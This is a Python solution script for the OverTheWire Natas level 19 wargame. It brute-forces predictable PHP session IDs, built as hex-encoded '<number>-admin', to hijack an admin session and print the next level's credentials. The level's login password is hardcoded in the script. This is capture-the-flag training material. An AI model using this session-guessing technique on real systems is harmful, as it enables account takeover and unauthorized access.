import requests
maxid = 641
url = "http://natas19.natas.labs.overthewire.org"
user = "natas19"
passwd = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
match = "You are an admin. The credentials for the next level are:"

for i in range(maxid):
    print(str(i))
    c = dict(PHPSESSID=(str(i)+'-admin').encode("utf-8").hex()) # need new PHPSESSID each time
    h = requests.get(url, auth=(user, passwd), cookies=c)
    if match in str(h.content):
        print (h.content)
        break
